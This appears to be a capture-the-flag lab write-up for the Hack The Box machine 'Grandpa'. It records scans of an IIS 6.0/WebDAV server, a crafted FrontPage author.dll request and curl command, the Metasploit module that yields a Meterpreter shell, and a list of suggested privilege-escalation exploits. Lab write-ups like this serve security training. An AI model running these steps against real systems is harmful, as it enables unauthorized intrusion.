# Grandpa 10.10.10.14 - Windows

 - __User__:
 - __Root__:

## Initial Attempt, 05/07/2020

### Enumeration

`nmap -oA grandpa -A -p- 10.10.10.14`

```powershell
Nmap scan report for 10.10.10.14
Host is up (0.030s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods:
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan:
|   Server Type: Microsoft-IIS/6.0
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Server Date: Thu, 07 May 2020 06:53:48 GMT
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  WebDAV type: Unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

#### Points-of-Interest:

 - webserver on 80, IIS v6.0 (old!)
 - default page? or mimicked default internet explorer page, anyway
 - many HTTP method warnings
 - what's WebDAV?

 ```
 Web Distributed Authoring and Versioning (WebDAV) is an extension of the Hypertext Transfer Protocol (HTTP) that allows clients to perform remote Web content authoring operations. WebDAV is defined in RFC 4918 by a working group of the Internet Engineering Task Force.

The WebDAV1 protocol provides a framework for users to create, change and move documents on a server. The most important features of the WebDAV protocol include the maintenance of properties about an author or modification date, namespace management, collections, and overwrite protection. Maintenance of properties includes such things as the creation, removal, and querying of file information. Namespace management deals with the ability to copy and move web pages within a server's namespace. Collections deal with the creation, removal, and listing of various resources. Lastly, overwrite protection handles aspects related to locking of files.
```

`nikto -host 10.10.10.14 -output nikto.txt`

```powershell
+ Server: Microsoft-IIS/6.0
+ Retrieved microsoftofficewebserver header: 5.0_Pub
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'microsoftofficewebserver' found, with contents: 5.0_Pub
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-aspnet-version header: 1.1.4322
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Retrieved dasl header: <DAV:sql>
+ Retrieved dav header: 1, 2
+ Retrieved ms-author-via header: MS-FP/4.0,DAV
+ Uncommon header 'ms-author-via' found, with contents: MS-FP/4.0,DAV
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+ OSVDB-5646: HTTP method ('Public' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: HTTP method ('Public' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: HTTP method ('Public' Header): 'MOVE' may allow clients to change file locations on the web server.
+ WebDAV enabled (UNLOCK PROPPATCH LOCK PROPFIND MKCOL COPY SEARCH listed as allowed)
+ OSVDB-13431: PROPFIND HTTP verb may show the server internal IP address: http://10.10.10.14/
+ OSVDB-396: /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted.
+ OSVDB-3233: /postinfo.html: Microsoft FrontPage default file found.
+ OSVDB-3233: /_vti_inf.html: FrontPage/SharePoint is installed and reveals its version number (check HTML source for more information).
+ OSVDB-3500: /_vti_bin/fpcount.exe: Frontpage counter CGI has been found. FP Server version 97 allows remote users to execute arbitrary system commands, though a vulnerability in this version could not be confirmed. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1376. http://www.securityfocus.com/bid/2252.
+ OSVDB-67: /_vti_bin/shtml.dll/_vti_rpc: The anonymous FrontPage user is revealed through a crafted POST.
+ /_vti_bin/_vti_adm/admin.dll: FrontPage/SharePoint file found.
+ 8015 requests: 0 error(s) and 27 item(s) reported on remote host
```

`gobuster dir -w /usr/share/wordlists/dirb/common.txt -t 40 -u http://10.10.10.14`

```powershell
/_private (Status: 403)
/_vti_bin (Status: 301)
/_vti_bin/_vti_adm/admin.dll (Status: 200)
/_vti_bin/_vti_aut/author.dll (Status: 200)
/_vti_bin/shtml.dll (Status: 200)
/_vti_cnf (Status: 403)
/_vti_log (Status: 403)
/_vti_pvt (Status: 403)
/_vti_txt (Status: 403)
/aspnet_client (Status: 403)
/images (Status: 301)
/Images (Status: 301)
```
From the nikto scan, `_vti_inf.html`:

```html
--><!-- FrontPage Configuration Information
    FPVersion="5.0.2.6790"
    FPShtmlScriptUrl="_vti_bin/shtml.dll/_vti_rpc"
    FPAuthorScriptUrl="_vti_bin/_vti_aut/author.dll"
    FPAdminScriptUrl="_vti_bin/_vti_adm/admin.dll"
    TPScriptUrl="_vti_bin/owssvr.dll"
-->
```

## Post-Sleep Continuation

 - Found a defcon presentation from 2003? (Defcon 11): https://defcon.org/images/defcon-11/dc-11-presentations/dc-11-Shannon/presentations/dc-11-shannon.pdf

 - It explains a bit about FrontPage's request handling structure. The exploitation tool they demo'd is no longer live, though I didn't didn't too hard.

 - A detailed vuln breakdown here: https://dl.packetstormsecurity.net/9910-exploits/webfolders.txt

 - I made a local copy to make sure it persists as `packetstormsec_webfolders.txt`. Excellent overview of FrontPage's security model (lack of). This is a gold mine, summary:

 ```
 When the post to author.dll succeeds, the client will then be able to browse the
web site as if it were browsing the file system.  And since an author has full
authoring capabilities, he can also do things such as place executable files in
the _vti_bin directory or other executable directories.  Having user read,
write, and execute access is just one step away from having full admin access.
```

 - It looks like we need to intercept and modify HTTP requests to the server, and through some crafted POST requests we may be able to unlock access. This doc has some potential examples: https://github.com/deepak0401/Front-Page-Exploit

```
POST /_vti_bin/_vti_aut/author.dll HTTP/1.1
MIME-Version: 1.0
Accept: auth/sicily
Content-Length: 219
Host: 10.10.10.14
Content-Type: application/x-www-form-urlencoded
X-Vermeer-Content-Type: application/x-www-form-urlencoded
Connection: Keep-Alive

method=list+documents%3a5%2e0%2e2%2e6790&service%5fname=&listHiddenDocs=true&lis
tExplorerDocs=true&listRecurse=false&listFiles=true&listFolders=true&listLinkInf
o=false&listIncludeParent=true&listDerived=false&listBorders=false
```

```shell
curl --data "method=list+documents%3a5%2e0%2e2%2e6790&service%5fname=&listHiddenDocs=true&listExplorerDocs=true&listRecurse=falselistFiles=true&listFolders=true&listLinkInfo=false&listIncludeParent=true&listDerived=falselistBorders=false" -H "MIME-Version: 1.0" -H "Accept: auth/sicily" -H "Content-Type: application/x-www-form-urlencoded" -H "Content-Length: 219" -H "Host: 10.10.10.14" -H "X-Vermeer-Content-Type: application/x-www-form-urlencoded" -H "Connection: Keep-Alive" http://10.10.10.14/_vti_bin/_vti_aut/author.dll
```

(Didn't work)

## Day 2 - Metasploit Attempt

`windows/iis/iis_webdav_scstoragepathfromurl`

```powershell
Computer        : GRANPA
OS              : Windows .NET Server (5.2 Build 3790, Service Pack 2).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows
```

From meterpreter `getuid` fails `[-] stdapi_sys_config_getuid: Operation failed: Access is denied.` So I dropped into a local `shell`

```powershell
c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service
```

I seem to get auto-kicked out of the local shell back to meterpreter after a few seconds. Navigating to `C:\Docs and Settings\` we can see a new user `Harry`. Access denied. Interestingly `c:\Documents and Settings\All Users\Desktop` has something called `Security Configuration Wizard.lnk`. I can access the web-root directories but so far no user-flag.

Looking for possible priv-esc solutions:

```powershell
msf5 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.14 - Collecting local exploits for x86/windows...
[*] 10.10.10.14 - 30 exploit checks are being tried...
[+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```
All listed locals fail with `Access denied`. Let's explore migrating to a new process.